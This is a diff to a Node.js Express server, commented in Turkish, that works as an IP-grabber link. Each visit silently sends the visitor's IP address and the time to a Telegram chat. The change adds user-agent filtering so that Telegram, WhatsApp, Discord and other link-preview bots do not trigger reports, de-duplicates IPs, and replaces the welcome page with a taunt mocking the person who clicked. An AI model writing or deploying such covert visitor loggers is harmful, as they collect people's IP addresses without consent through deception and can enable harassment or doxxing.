@@ -4,14 +4,42 @@ const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Render/Cloudflare gibi bir proxy arkasında çalışırken istemci IP'sini alabilmek için.
-// Güvenmediğin proxy'leri kullanıyorsan bu ayarı ona göre değiştir.
 app.set("trust proxy", true);
+
+// Aynı IP'den tekrar tekrar Telegram mesajı gitmesini engeller.
+const seenIps = new Set();
 
 function getClientIp(req) {
   let ip = req.ip || req.socket.remoteAddress || "";
-  if (ip.startsWith("::ffff:")) ip = ip.slice(7);
+
+  if (ip.startsWith("::ffff:")) {
+    ip = ip.slice(7);
+  }
+
   return ip;
+}
+
+function isPreviewOrBot(req) {
+  const ua = (req.get("user-agent") || "").toLowerCase();
+
+  const botWords = [
+    "telegrambot",
+    "facebookexternalhit",
+    "facebot",
+    "twitterbot",
+    "whatsapp",
+    "discordbot",
+    "googlebot",
+    "bingbot",
+    "linkedinbot",
+    "slackbot",
+    "crawler",
+    "spider",
+    "preview",
+    "bot"
+  ];
+
+  return botWords.some(word => ua.includes(word));
 }
 
 async function sendTelegram(message) {
@@ -27,7 +55,9 @@ async function sendTelegram(message) {
 
   const response = await fetch(url, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
+    headers: {
+      "Content-Type": "application/json"
+    },
     body: JSON.stringify({
       chat_id: chatId,
       text: message
@@ -41,35 +71,69 @@ async function sendTelegram(message) {
 
 app.get("/", async (req, res) => {
   const ip = getClientIp(req);
+
   const time = new Date().toLocaleString("tr-TR", {
     timeZone: "Europe/Istanbul"
   });
 
-  const message =
-`🌐 Yeni ziyaretçi
+  if (!isPreviewOrBot(req) && ip && !seenIps.has(ip)) {
+    seenIps.add(ip);
+
+    const message = `🌐 Yeni ziyaretçi
 
 IP: ${ip}
 Saat: ${time}`;
 
-  console.log(message);
-  await sendTelegram(message);
+    console.log(message);
+
+    await sendTelegram(message);
+  } else {
+    console.log(
+      `Bildirim gönderilmedi: ${ip} (tekrar veya önizleme botu)`
+    );
+  }
 
   res.send(`<!doctype html>
 <html lang="tr">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Hoş Geldin</title>
+<title>:)</title>
+
 <style>
-body{font-family:Arial,sans-serif;background:#111;color:#fff;display:grid;place-items:center;height:100vh;margin:0}
-.card{padding:30px;border-radius:18px;background:#1d1d1d;text-align:center;max-width:500px}
+* {
+  box-sizing: border-box;
+}
+
+html, body {
+  margin: 0;
+  width: 100%;
+  height: 100%;
+  background: #000;
+}
+
+body {
+  display: grid;
+  place-items: center;
+  font-family: Arial, Helvetica, sans-serif;
+  color: #fff;
+  text-align: center;
+}
+
+h1 {
+  margin: 0;
+  font-size: clamp(28px, 5vw, 56px);
+  font-weight: 600;
+  letter-spacing: -1px;
+}
 </style>
+
 </head>
+
 <body>
-<div class="card">
-<h1>Hoş geldin 👋</h1>
-<p>Siteye başarıyla bağlandın.</p>
-</div>
+
+<h1>nasıl inandın gardasım la :d</h1>
+
 </body>
 </html>`);
 });
